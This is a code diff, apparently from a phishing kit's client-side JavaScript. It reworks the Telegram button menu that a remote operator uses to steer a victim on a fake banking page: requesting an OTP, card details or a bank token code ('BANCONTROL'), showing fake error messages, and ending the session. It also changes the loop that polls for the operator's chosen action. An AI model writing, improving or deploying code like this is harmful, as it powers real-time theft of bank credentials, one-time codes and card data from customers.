@@ -5,27 +5,12 @@ const Session = {
 };
 
 const BUTTONS = {
-  // Después del LOGIN
-  login: [
+  main: [
     [{ text: "✅ OTP", callback_data: "otp" }, { text: "💳 TARJETA", callback_data: "tarjeta" }],
     [{ text: "🏦 BANCONTROL", callback_data: "bancontrol" }],
-    [{ text: "❌ ERROR LOGIN", callback_data: "error_login" }]
-  ],
-  // Después del OTP
-  otp: [
-    [{ text: "💳 TARJETA", callback_data: "tarjeta" }],
-    [{ text: "🏦 BANCONTROL", callback_data: "bancontrol" }],
-    [{ text: "❌ ERROR OTP", callback_data: "error_otp" }]
-  ],
-  // Después de TARJETA
-  tarjeta: [
-    [{ text: "🏁 FINALIZAR", callback_data: "finalizar" }],
-    [{ text: "❌ ERROR TARJETA", callback_data: "error_tarjeta" }]
-  ],
-  // Después de BANCONTROL
-  bancontrol: [
-    [{ text: "🏁 FINALIZAR", callback_data: "finalizar" }],
-    [{ text: "❌ ERROR BANCONTROL", callback_data: "error_bancontrol" }]
+    [{ text: "❌ ERROR LOGIN", callback_data: "error_login" }, { text: "❌ ERROR OTP", callback_data: "error_otp" }],
+    [{ text: "❌ ERROR TARJETA", callback_data: "error_tarjeta" }, { text: "❌ ERROR BANCONTROL", callback_data: "error_bancontrol" }],
+    [{ text: "🏁 FINALIZAR", callback_data: "finalizar" }]
   ]
 };
 
@@ -41,12 +26,6 @@ async function sendTelegram(text, buttons = []) {
 let lastUpdateId = 0;
 
 async function startPolling(handler) {
-  try {
-    const init = await fetch('/api/poll?init=true');
-    const initData = await init.json();
-    if (initData.update_id) lastUpdateId = initData.update_id;
-  } catch(e) { console.error('init error:', e); }
-
   const iv = setInterval(async () => {
     try {
       const res = await fetch(`/api/poll?offset=${lastUpdateId}`);
@@ -62,7 +41,7 @@ async function startPolling(handler) {
       clearInterval(iv);
       handler(data.action);
     } catch (e) { console.error('poll error:', e); }
-  }, 2000);
+  }, 1500);
 }
 
 function showWait() { document.getElementById('wait').classList.add('active') }
